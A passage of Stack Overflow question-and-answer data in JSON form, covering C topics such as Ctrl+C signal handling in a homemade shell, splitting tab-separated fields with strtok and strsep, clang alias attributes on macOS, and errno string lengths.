"KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459371903, "post_id": 36319350, "comment_id": 60262717, "body": "@EugeneSh. So you mean in <code>ctrl_C_handler()</code> move <code>signal(SIGINT, ctrl_C_handler)</code> from the start to the end of the function? I did this and it didn&#39;t change anything unfortunately."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1459371978, "post_id": 36319350, "comment_id": 60262758, "body": "In the code posted you don&#39;t have it neither in the start nor in the end. Update: NO! Don&#39;t call loop from the handler! It is getting stuck there."}, {"owner": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1459372048, "post_id": 36319350, "comment_id": 60262798, "body": "@EugeneSh. Sorry, see the edit at the end of my post"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1459372805, "post_id": 36319350, "comment_id": 60263203, "body": "1) don&#39;t call <code>printf()</code> from within a signal handler, it is not signal safe. 2) you need <code>sigsetjmp()</code>"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1459373485, "post_id": 36319350, "comment_id": 60263543, "body": "You link to another very similar article, where both the <code>sigsetjmp()</code> and the <i>don&#39;t printf from a signalhandler</i> are given. Have you actually <b>read</b> that question and answers?"}], "answers": [{"comments": [{"owner": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "edited": false, "score": 0, "creation_date": 1459382307, "post_id": 36320021, "comment_id": 60266861, "body": "Your first solution isn&#39;t possible in my case as <code>signal</code> is called in <code>main</code> - am I correct in saying this?"}, {"owner": {"reputation": 316, "user_id": 3685847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a657e236f6e674a1bd3e3b1125cc3fa6?s=128&d=identicon&r=PG&f=1", "display_name": "Evelyn Kokemoor", "link": "https://stackoverflow.com/users/3685847/evelyn-kokemoor"}, "reply_to_user": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "edited": false, "score": 0, "creation_date": 1459382440, "post_id": 36320021, "comment_id": 60266895, "body": "You&#39;ll still call signal the first time, in main or wherever, just once. Every time the signal is caught thereafter, the handler will reattach itself by calling signal in its own body."}, {"owner": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "edited": false, "score": 0, "creation_date": 1459383037, "post_id": 36320021, "comment_id": 60267085, "body": "I&#39;m really struggling to get anywhere with this due to my poor undertanding of the <code>signal</code> function. I have my <code>main</code> method just as it is above, calling <code>signal(SIGINT, ctrl_C_handler)</code>. Then I have <code>void ctrl_C_handler() { signal(SIGINT, ctrl_C_handler) }</code>, but it is still only printing <code>^C</code> without printing the new prompt. What else do I have to add to this?"}, {"owner": {"reputation": 316, "user_id": 3685847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a657e236f6e674a1bd3e3b1125cc3fa6?s=128&d=identicon&r=PG&f=1", "display_name": "Evelyn Kokemoor", "link": "https://stackoverflow.com/users/3685847/evelyn-kokemoor"}, "reply_to_user": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "edited": false, "score": 0, "creation_date": 1459383408, "post_id": 36320021, "comment_id": 60267204, "body": "When you call signal(SIGINT, &amp;foo), the OS will remember to call foo when the process gets a SIGINT. Wherever your program is in its execution, it will be as if foo() was called then and there. When foo() finishes, the process will go back to doing whatever it was doing. But the OS will only remember to do this once, so you have to keep reminding it after every time. The simplest way is to just have foo() do it."}], "tags": [], "owner": {"reputation": 316, "user_id": 3685847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a657e236f6e674a1bd3e3b1125cc3fa6?s=128&d=identicon&r=PG&f=1", "display_name": "Evelyn Kokemoor", "link": "https://stackoverflow.com/users/3685847/evelyn-kokemoor"}, "is_accepted": false, "score": 0, "last_activity_date": 1459373724, "last_edit_date": 1459373724, "creation_date": 1459373024, "answer_id": 36320021, "question_id": 36319350, "link": "https://stackoverflow.com/questions/36319350/writing-my-own-shell-trouble-with-handling-ctrlc-sigint-correctly/36320021#36320021", "title": "Writing my own shell - trouble with handling ctrl+c (SIGINT) correctly", "body": "<p><code>signal</code> attaches a handler only for the first appropriate signal that is received. After that invocation, the handler is detached. A common method is to have the handler reattach itself as in <code>int foo() { signal(SIGINT, &amp;foo); do_the_stuff(); }</code>.</p>\n\n<p>However, <a href=\"http://linux.die.net/man/2/signal\" rel=\"nofollow\"><code>signal</code> is non-portable</a>. POSIX recommends using <a href=\"http://linux.die.net/man/2/sigaction\" rel=\"nofollow\"><code>sigaction</code></a> instead.</p>\n"}], "owner": {"reputation": 2986, "user_id": 4564080, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/83009ae032b72f3c1aa2bba01ab123e1?s=128&d=identicon&r=PG&f=1", "display_name": "KOB", "link": "https://stackoverflow.com/users/4564080/kob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1338, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1459373724, "creation_date": 1459370707, "last_edit_date": 1495540787, "question_id": 36319350, "link": "https://stackoverflow.com/questions/36319350/writing-my-own-shell-trouble-with-handling-ctrlc-sigint-correctly", "title": "Writing my own shell - trouble with handling ctrl+c (SIGINT) correctly", "body": "<p>I am writing my own simple shell. One thing which I need to do is to control the SIGINT signal by remaining in the shell and just printing the prompt on a fresh line when ctrl+c is pressed. Currently, I have been able to handle the signal and the shell simply prints <code>^C</code> after the prompt. However, the cursor remains on the same line. What I would like to do instead is have the shell print <code>^C</code> after the prompt, move onto the next line and then print a fresh prompt.</p>\n\n<p>I have found <a href=\"https://stackoverflow.com/questions/20109424/handling-ctrl-c-in-dummy-shell\">this question</a>, which addresses the exact same issue. The problem with mine is that my <code>main</code> calls another function where the prompt loop is run. I have tried many different ways to try to implement the solution given on the link above, in both the main and the prompt loop function, but all with no luck. Here is my code so far:</p>\n\n<p><strong>Main.c</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;signal.h&gt;\n#include \"MyShell.h\"\n\nvoid ctrl_C_handler();\n\nint main(int argc, char **argv) {\n\n    signal(SIGINT, ctrl_C_handler);\n    my_shell_loop();\n\n    return EXIT_SUCCESS;\n}\n\nvoid ctrl_C_handler() { \n    //Catches the SIGINT signal fine without anything happening in this function\n    //I cannot figure out how to have MyShell print a fresh prompt on a new line \n    //after ctrl+C is pressed\n}\n</code></pre>\n\n<p><strong>MyShellLoop.c</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n#include \"MyShell.h\"\n\nchar *get_time();\n\nvoid my_shell_loop() {\n    char *line;\n    char **args;\n    int status;\n\n    char *prompt = (char *) malloc(17);\n\n    do {\n        strcpy(prompt, get_time());\n        strcat(prompt, \" # \");\n        printf(\"%s\", prompt);\n        line = read_command();\n        args = split_command(line);\n        status = execute_command(args);\n\n        free(line);\n        free(args);\n    } while (status);\n\n    free(prompt);\n}\n</code></pre>\n\n<p><strong>EDIT</strong></p>\n\n<p>Using:</p>\n\n<pre><code>void ctrl_C_handler() { \n    signal(SIGINT, ctrl_C_handler);\n    printf(\"\\n\");\n    my_shell_loop();\n}\n</code></pre>\n\n<p>acts as desired the first time ctrl+c is pressed, but then acts as it did before for any further times it is pressed.</p>\n"}, {"tags": ["c", "strtok"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1459372541, "post_id": 36319131, "comment_id": 60263054, "body": "Watch it - your <code>if(tok == NULL || &#39;&#39;)</code> attempt looks like you are used to another language. It is technically valid C but almost certainly not what you wanted to do."}, {"owner": {"reputation": 3854, "user_id": 2235885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/09d0d6a08639ef79ef960a52bd013e02?s=128&d=identicon&r=PG", "display_name": "joop", "link": "https://stackoverflow.com/users/2235885/joop"}, "edited": false, "score": 0, "creation_date": 1459427376, "post_id": 36319131, "comment_id": 60288948, "body": "strtok() is unusable. Build a state machine and/or use strspn()/strcspn()."}], "answers": [{"comments": [{"owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "edited": false, "score": 1, "creation_date": 1459372898, "post_id": 36319494, "comment_id": 60263245, "body": "And here is a simple implementation of <code>strsep()</code> that you can use if it&#39;s not already part of your toolchain: <a href=\"http://stackoverflow.com/a/8514474/12711\">stackoverflow.com/a/8514474/12711</a>"}], "tags": [], "owner": {"reputation": 4916, "user_id": 3991400, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5049bb61601c16ae408f5a56b5ed2518?s=128&d=identicon&r=PG&f=1", "display_name": "midor", "link": "https://stackoverflow.com/users/3991400/midor"}, "is_accepted": false, "score": 3, "last_activity_date": 1459371210, "creation_date": 1459371210, "answer_id": 36319494, "question_id": 36319131, "link": "https://stackoverflow.com/questions/36319131/split-string-in-c-to-recognize-consecutive-tabs/36319494#36319494", "title": "Split String in C to recognize consecutive tabs", "body": "<p>You can't use strtok in your case. \nFrom <code>man strtok:</code></p>\n\n<blockquote>\n  <p>The  strtok()  function breaks a string into a sequence of zero or more\n         nonempty tokens\n  ...\n  From the above description, it follows that a sequence of two  or  more\n         contiguous  delimiter  bytes in the parsed string is considered to be a\n         single delimiter, and that delimiter bytes at the start or end  of  the\n         string  are  ignored.  Put another way: the tokens returned by strtok()\n         are always nonempty strings.   Thus,  for  example,  given  the  string\n         \"aaa;;bbb,\",  successive  calls  to strtok() that specify the delimiter\n         string \";,\" would return the strings \"aaa\" and \"bbb\", and then  a  null\n         pointer</p>\n</blockquote>\n\n<p>So you will have to find an alternative, which could either be manually writing a function that uses linear search and <code>strncpy</code>, or <code>sscanf</code> or using <code>strsep</code>, if it is available. The latter would very likely be my choice, because it was intended as replacement for strtok.</p>\n\n<p>From <code>man strsep:</code></p>\n\n<blockquote>\n  <p>The  strsep()  function  was introduced as a replacement for strtok(3),\n         since the latter cannot handle empty fields.  However,  strtok(3)  con\u2010\n         forms to C89/C99 and hence is more portable.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 16376, "user_id": 2009616, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/oiCJA.jpg?s=128&g=1", "display_name": "isedev", "link": "https://stackoverflow.com/users/2009616/isedev"}, "is_accepted": false, "score": 0, "last_activity_date": 1459372148, "last_edit_date": 1459372148, "creation_date": 1459371308, "answer_id": 36319531, "question_id": 36319131, "link": "https://stackoverflow.com/questions/36319131/split-string-in-c-to-recognize-consecutive-tabs/36319531#36319531", "title": "Split String in C to recognize consecutive tabs", "body": "<p>Here's a solution using <code>strsep</code>, which was introduced specifically to address the fact that <code>strtok</code> skips over consecutive delimiters:</p>\n\n<pre><code>char *cur, *nxt;\nwhile (fgets(buf, sizeof(buf), fp) != NULL)\n{\n    nxt = buf;\n    while ((cur = strsep(&amp;nxt, \"\\t\")) != NULL)\n    {\n        printf(\"%s-&gt;\",cur);\n    }\n}\n</code></pre>\n\n<p>NOTE: the string passed to <code>strsep</code> must be writable (passing a literal string specifically does not work). It will be modified by <code>strsep</code> (delimiters are overwritten with NUL characters on consecutive calls).</p>\n"}, {"tags": [], "owner": {"reputation": 137, "user_id": 4983155, "user_type": "registered", "accept_rate": 56, "profile_image": "https://lh6.googleusercontent.com/-Jn4zByOMdjc/AAAAAAAAAAI/AAAAAAAAB2Q/ra2ySY0yfHU/photo.jpg?sz=128", "display_name": "Ahmed F. Mostafa", "link": "https://stackoverflow.com/users/4983155/ahmed-f-mostafa"}, "is_accepted": false, "score": 0, "last_activity_date": 1459426125, "creation_date": 1459426125, "answer_id": 36333042, "question_id": 36319131, "link": "https://stackoverflow.com/questions/36319131/split-string-in-c-to-recognize-consecutive-tabs/36333042#36333042", "title": "Split String in C to recognize consecutive tabs", "body": "<p>A good approach to start digesting how this could be implemented , the below function will do that , read it please. :</p>\n\n<pre><code>int splitLine(char *buf, char **argv, int max_args)\n{\n    int arg;\n\n    /* skip over initial spaces */\n    while (isspace(*buf)) buf++;\n\n    for (arg = 0; arg &lt; max_args\n        &amp;&amp; *buf != '\\0'; arg++) {\n        argv[arg] = buf;\n        /* skip past letters in word */\n        while (*buf != '\\0'\n            &amp;&amp; !isspace(*buf)) {\n            buf++;\n        }\n        /* if not at line's end, mark\n        * word's end and continue */\n        if (*buf != '\\0') {\n            *buf = '\\0';\n            buf++;\n        }\n        /* skip over extra spaces */\n        while (isspace(*buf)) buf++;\n    }\n    return arg;\n}\n</code></pre>\n\n<p>This function use a space separator, you can reimplement to use any other one.</p>\n"}], "owner": {"reputation": 21, "user_id": 5588405, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7b84106e9ee522ca766caa70bf11a42?s=128&d=identicon&r=PG&f=1", "display_name": "user5588405", "link": "https://stackoverflow.com/users/5588405/user5588405"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 702, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1459426125, "creation_date": 1459369900, "last_edit_date": 1459372461, "question_id": 36319131, "link": "https://stackoverflow.com/questions/36319131/split-string-in-c-to-recognize-consecutive-tabs", "title": "Split String in C to recognize consecutive tabs", "body": "<p>I have a file that has certain fields separated by tabs. There will always be 17 tabs but there order can vary, such as..</p>\n\n<pre><code>75104\\tDallas\\t85\\t34.46\\t45.64\n75205\\tHouston\\t\\t37.34\\t87.32\n93434\\t\\t\\t1.23\\t3.32\n</code></pre>\n\n<p>When I use <code>strtok</code> in the following fashion</p>\n\n<pre><code>    while (fgets(buf, sizeof(buf), fp) != NULL) {\n    tok = strtok(buf,\"\\t\");\n\n    while(tok != NULL) {\n        printf(\"%s-&gt;\",tok);\n        tok = strtok(NULL,\"\\t\");\n    }\n}\n</code></pre>\n\n<p>I get all the tokens, but double tabs <code>\\t\\t</code> or more are ignored. However, I need to know when a field is empty, I cannot have <code>strtok</code> ignore multiple tabs because the structure depends on 17 tabs being counted, using a placeholder if a field is empty.</p>\n\n<p>I've tried dealing with the problem with an </p>\n\n<pre><code>if(tok == NULL || '')\n</code></pre>\n\n<p>but I don't think <code>strtok</code> recognizes a tab after a tab. What is the best way to deal with this issue?</p>\n"}, {"tags": ["c", "macos", "clang"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459370086, "post_id": 36319000, "comment_id": 60261663, "body": "<code>__attribute__</code> is not standard C, thus not portable by definition. Additionally, weak symbols require the object file format support it. Thus you have a portability issue anyway. Maybe there is a standard compliant way to achieve what you want. At least you should use macros to encapsulate the <code>__attribute__</code> syntax."}], "owner": {"reputation": 8043, "user_id": 491687, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/2174f845b769ea2ad2242047f3118128?s=128&d=identicon&r=PG", "display_name": "Wesley Bland", "link": "https://stackoverflow.com/users/491687/wesley-bland"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1010, "favorite_count": 2, "answer_count": 0, "score": 5, "last_activity_date": 1459369437, "creation_date": 1459369437, "question_id": 36319000, "link": "https://stackoverflow.com/questions/36319000/aliasing-on-clang-for-osx", "title": "Aliasing on Clang for OSX", "body": "<p>I'm working on getting some code to compile on OSX that's been pretty Linux focused for a while. One of the pieces involves using a variable alias that doesn't seem to translate well:</p>\n\n<pre><code>extern type1_t var_name __attribute__((alias(\"var_name_\")));\nextern type2_t var_name2[SIZE_MACRO] __attribute__((alias(\"var_name2_\")));\n</code></pre>\n\n<p>When I compile this on my Mac with <code>Apple LLVM version 7.3.0 (clang-703.0.29)</code>, I get this output:</p>\n\n<pre><code>filename.c:81:66: error: only weak aliases are supported on darwin\nextern type1_t var_name __attribute__((alias(\"var_name_\")));\n                                       ^\nfilename.c:82:92: error: only weak aliases are supported on darwin\nextern type2_t var_name2[SIZE_MACRO] __attribute__((alias(\"var_name2_\")));\n                                                    ^\n</code></pre>\n\n<p>So I figured I needed to make these weak symbols by adding <code>weak,</code> to the definition, but I get the same result:</p>\n\n<pre><code>filename.c:81:66: error: only weak aliases are supported on darwin\nextern type1_t var_name __attribute__((weak,alias(\"var_name_\")));\n                                       ^\nfilename.c:82:92: error: only weak aliases are supported on darwin\nextern type2_t var_name2[SIZE_MACRO] __attribute__((weak,alias(\"var_name2_\")));\n                                                    ^\n</code></pre>\n\n<p>Based on research from the web, if I move to GCC, that will clear things up for this particular problem, but I need this to be able to compile cleanly for Macs on all compilers, including Clang. What do I need to do here to make this work?</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1459369245, "post_id": 36318928, "comment_id": 60261186, "body": "C and C++ are different languages!"}, {"owner": {"reputation": 21714, "user_id": 1392132, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QF6FZ.jpg?s=128&g=1", "display_name": "5gon12eder", "link": "https://stackoverflow.com/users/1392132/5gon12eder"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 9, "creation_date": 1459369524, "post_id": 36318928, "comment_id": 60261350, "body": "@Olaf While I generally appreciate your efforts in making this distinction clear, I believe that in this case, speaking of C and C++ together is legit as the <code>errno</code> concept is used by both of them alike. Choosing either tag over the other one would be arbitrary."}, {"owner": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "edited": false, "score": 0, "creation_date": 1459369685, "post_id": 36318928, "comment_id": 60261445, "body": "Wouldn&#39;t it also depend on the locale being used?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 21714, "user_id": 1392132, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/QF6FZ.jpg?s=128&g=1", "display_name": "5gon12eder", "link": "https://stackoverflow.com/users/1392132/5gon12eder"}, "edited": false, "score": 0, "creation_date": 1459369806, "post_id": 36318928, "comment_id": 60261509, "body": "@5gon12eder: I&#39;m afraid I have to disagree. The <code>errno</code> &amp; related are part of the C compatibility interface and the libc, thus not native C++/libc++. Said that, please notice the question explicitly references the C standard."}, {"owner": {"reputation": 231, "user_id": 6041036, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f2ed6898d079dd8667b7e0ae1555715?s=128&d=identicon&r=PG&f=1", "display_name": "xrgb", "link": "https://stackoverflow.com/users/6041036/xrgb"}, "edited": false, "score": 1, "creation_date": 1459369833, "post_id": 36318928, "comment_id": 60261531, "body": "Can you choose your own max, and clip the error messages at runtime?"}, {"owner": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 2, "creation_date": 1459370145, "post_id": 36318928, "comment_id": 60261698, "body": "I might be missing something, but an error message larger than ssize_t seems completely crazy on any platform where ssize_t is larger than int8_t."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459370423, "post_id": 36318928, "comment_id": 60261851, "body": "@Olaf I worded it that way because of an assumption that C++ just followed whatever the C standard says, or that failing that, it would at most be <i>less</i> permissive rather than <i>more</i> permissive vs. the C standard. Still, I&#39;ve re-worded that phrase to now include both. Would you say that this question has no meaningful relevance to the C++ world, or that C++ would have a substantially different answer than the answer for C?"}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "edited": false, "score": 0, "creation_date": 1459370498, "post_id": 36318928, "comment_id": 60261906, "body": "@MarkNunberg Yes. I tried to word the question to account for that - feel free to suggest/edit clarifications to the wording if that&#39;s not clear."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459370632, "post_id": 36318928, "comment_id": 60261980, "body": "@mtraceur: I really think you should have left it with the C standard. Adding C++ makes the question possibly even broader as now C++ features come into play. If you want a C++ solution, though, just remove the C tag. Either way, a solution can very well depend on the language you use. Notice that identical syntax does not imply identical semantics!"}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 231, "user_id": 6041036, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f2ed6898d079dd8667b7e0ae1555715?s=128&d=identicon&r=PG&f=1", "display_name": "xrgb", "link": "https://stackoverflow.com/users/6041036/xrgb"}, "edited": false, "score": 0, "creation_date": 1459371089, "post_id": 36318928, "comment_id": 60262245, "body": "@xrgb Yes - I can work around the entire problem at runtime, whether that way or without even clipping them by wrapping writev. But knowing at compile-time would allow preprocessor macros to exclude the unnecessary code, which I think is valuable for several reasons."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1459371673, "post_id": 36318928, "comment_id": 60262593, "body": "The C (and I suspect the C++) standard will not help concerning <code>SSIZE_MAX</code> as it does not define <code>SSIZE_MAX</code>.  If <code>SSIZE_MAX</code> is important to your code, suggest tagging the environment of interest that defines it."}, {"owner": {"reputation": 13419, "user_id": 1405588, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/01a91a47db3526000ffa9247f95fff62?s=128&d=identicon&r=PG", "display_name": "o11c", "link": "https://stackoverflow.com/users/1405588/o11c"}, "edited": false, "score": 1, "creation_date": 1459371975, "post_id": 36318928, "comment_id": 60262756, "body": "Note, runtime generation <i>does</i> happen for out-of-range values (&gt; 134 on Linux), but this generates smaller strings than many in-range values. But including additional metadata is forbidden because there&#39;s no saying when or whether the error actually occured."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 0, "creation_date": 1459372094, "post_id": 36318928, "comment_id": 60262819, "body": "@zneak: Actually, if I remember the standards right, <code>ssize_t</code> must always be larger than <code>int8_t</code>: <code>ssize_t</code> is the signed equivalent of <code>size_t</code>, and <code>size_t</code> is bound to at a minimum support values up to <code>65 535</code>, and the latest POSIX/SUS require <code>ssize_t</code> to at least support values up to <code>32 767</code>. However, consider that there are multiple maxima going into a typical error message&#39;s maximum size: e.g. <code>ARG_MAX + MAGICAL_ERR_STR_MAX + sizeof(my_biggest_additional_error_text) - 1</code> together must be smaller than <code>SSIZE_MAX</code> for it to be safe to ignore the possibility of overflowing <code>SSIZE_MAX</code>."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/OlDV3.png?s=128&g=1", "display_name": "mtraceur", "link": "https://stackoverflow.com/users/4372452/mtraceur"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459372317, "post_id": 36318928, "comment_id": 60262946, "body": "@chux: While the <code>SSIZE_MAX</code> and <code>writev</code> details were an example of my current usecase, the question itself is more broadly relevant: if I were to port my code to Windows&#39; <code>WriteFileGather</code> or whatever, the constants to check against change, but knowing the maximum length of an error string remains relevant &quot;would be nice to have&quot; information."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1459372618, "post_id": 36318928, "comment_id": 60263115, "body": "@mtraceur Certainly <code>strlen(any_string) &lt;= SIZE_MAX</code> is true.  <code>strlen(strerror(errno))</code> is not defined by C to be more constrained.  So that the portable limit."}, {"owner": {"reputation": 1744, "user_id": 4372452, "user_type": "registered", "accept_rate": 60, 